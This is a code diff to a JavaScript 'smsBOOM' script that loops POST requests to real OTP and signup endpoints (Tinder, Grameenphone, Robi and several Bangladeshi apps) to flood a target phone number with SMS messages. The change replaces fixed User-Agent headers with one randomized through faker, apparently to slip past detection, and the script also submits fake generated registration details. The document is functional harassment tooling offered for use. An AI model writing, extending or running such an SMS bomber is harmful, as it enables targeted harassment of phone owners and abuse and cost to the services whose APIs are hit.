@@ -7,6 +7,11 @@ const faker = require("faker");
 async function delay(s) {
   return new Promise((resolve) => setTimeout(resolve, s * 1000));
 }
+const randomUseragent = {
+  "User-Agent": faker.internet.userAgent(),
+  "Accept-Language": "en",
+  "Content-Type": "application/json",
+};
 
 async function smsBOOM(number, amount) {
   let dataFSms = {
@@ -42,11 +47,7 @@ async function smsBOOM(number, amount) {
     request
       .post({
         url: "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=en",
-        headers: {
-          "User-Agent": "Tinder/7.5.3 (iPhone; iOS 10.3.2; Scale/2.00)",
-          "Accept-Language": "en",
-          "Content-Type": "application/json",
-        },
+        headers: randomUseragent,
         body: JSON.stringify({
           phone: number,
         }),
@@ -71,12 +72,7 @@ async function smsBOOM(number, amount) {
     request
       .post({
         url: "https://api.bdtickets.com:20100/v1/auth",
-        headers: {
-          "User-Agent":
-            "Dalvik/2.1.0 (Linux; U; Android 10; SM-A205F Build/QP1A.190711.020)",
-          "Accept-Language": "en",
-          "Content-Type": "application/json",
-        },
+        headers: randomUseragent,
         body: JSON.stringify({
           applicationChannel: "WEB_APP",
           createUserCheck: true,
@@ -104,12 +100,7 @@ async function smsBOOM(number, amount) {
 
       .post({
         url: "https://core.easy.com.bd/api/v1/registration",
-        headers: {
-          "User-Agent":
-            "Dalvik/2.1.0 (Linux; U; Android 10; SM-A205F Build/QP1A.190711.020)",
-          "Accept-Language": "en",
-          "Content-Type": "application/json",
-        },
+        headers: randomUseragent,
         body: JSON.stringify({
           name: faker.name.firstName(),
           email: faker.internet.email(),
@@ -139,12 +130,7 @@ async function smsBOOM(number, amount) {
     request
       .post({
         url: "https://apix.rabbitholebd.com/appv2/login/requestOTP",
-        headers: {
-          "User-Agent":
-            "Dalvik/2.1.0 (Linux; U; Android 10; SM-A205F Build/QP1A.190711.020)",
-          "Accept-Language": "en",
-          "Content-Type": "application/json",
-        },
+        headers: randomUseragent,
         body: JSON.stringify({
           mobile: `+88${no}`,
         }),
@@ -169,12 +155,7 @@ async function smsBOOM(number, amount) {
     request
       .post({
         url: "https://auth.qcoom.com/api/v1/otp/send",
-        headers: {
-          "User-Agent":
-            "Dalvik/2.1.0 (Linux; U; Android 10; SM-A205F Build/QP1A.190711.020)",
-          "Accept-Language": "en",
-          "Content-Type": "application/json",
-        },
+        headers: randomUseragent,
         body: JSON.stringify({
           mobileNumber: `+88${no}`,
         }),
@@ -199,12 +180,7 @@ async function smsBOOM(number, amount) {
     request
       .post({
         url: "https://fundesh.com.bd/api/auth/generateOTP?service_key=",
-        headers: {
-          "User-Agent":
-            "Dalvik/2.1.0 (Linux; U; Android 10; SM-A205F Build/QP1A.190711.020)",
-          "Accept-Language": "en",
-          "Content-Type": "application/json",
-        },
+        headers: randomUseragent,
         body: JSON.stringify({
           msisdn: `${no.substring(1)}`,
         }),
@@ -231,12 +207,7 @@ async function smsBOOM(number, amount) {
     request
       .post({
         url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
-        headers: {
-          "User-Agent":
-            "Dalvik/2.1.0 (Linux; U; Android 10; SM-A205F Build/QP1A.190711.020)",
-          "Accept-Language": "en",
-          "Content-Type": "application/json",
-        },
+        headers: randomUseragent,
         body: JSON.stringify({
           mobile_no: no,
         }),
@@ -263,12 +234,7 @@ async function smsBOOM(number, amount) {
     request
       .post({
         url: "https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation",
-        headers: {
-          "User-Agent":
-            "Dalvik/2.1.0 (Linux; U; Android 10; SM-A205F Build/QP1A.190711.020)",
-          "Accept-Language": "en",
-          "Content-Type": "application/json",
-        },
+        headers: randomUseragent,
         body: JSON.stringify({
           bioscope: 0,
           bundle_id: 610744,
@@ -306,12 +272,7 @@ async function smsBOOM(number, amount) {
     request
       .post({
         url: "https://weblogin.grameenphone.com/backend/api/v1/otp",
-        headers: {
-          "User-Agent":
-            "Mozilla/5.0 (Linux; Android 10; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
-          "Accept-Language": "en",
-          "Content-Type": "application/json",
-        },
+        headers: randomUseragent,
         body: JSON.stringify({
           msisdn: no,
         }),
@@ -341,12 +302,7 @@ async function smsBOOM(number, amount) {
     request
       .post({
         url: "https://webapi.robi.com.bd/v1/account/login/otp",
-        headers: {
-          "User-Agent":
-            "Mozilla/5.0 (Linux; Android 10; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
-          "Accept-Language": "en",
-          "Content-Type": "application/json",
-        },
+        headers: randomUseragent,
         body: JSON.stringify({
           password: "",
           phone_number: no,
